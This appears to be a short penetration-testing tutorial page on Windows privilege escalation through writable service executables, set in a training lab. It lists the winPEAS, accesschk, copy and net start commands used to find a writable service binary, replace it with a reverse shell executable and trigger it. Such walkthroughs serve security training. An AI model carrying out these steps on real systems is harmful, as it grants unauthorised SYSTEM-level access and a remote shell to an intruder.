# Insecure Service Executables

If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable. Remember to create a backup of the original executable if you are exploiting this in a real system!

Run winPEAS to check for service misconfigurations:

```
winPEASany.exe quiet servicesinfo
```

![](<../../../../.gitbook/assets/image (86).png>)

Note that the “filepermsvc” service has an executable which appears to be writable by everyone. We can confirm this with accesschk.exe:

```
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

![](<../../../../.gitbook/assets/image (91).png>)

Create a backup of the original service executable:

```
copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
```

Copy the reverse shell executable to overwrite the service executable:

```
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```

![](<../../../../.gitbook/assets/image (96).png>)

Start a listener on Kali, and then start the service to trigger the exploit:

```
net start filepermsvc
```

![](<../../../../.gitbook/assets/image (83).png>)
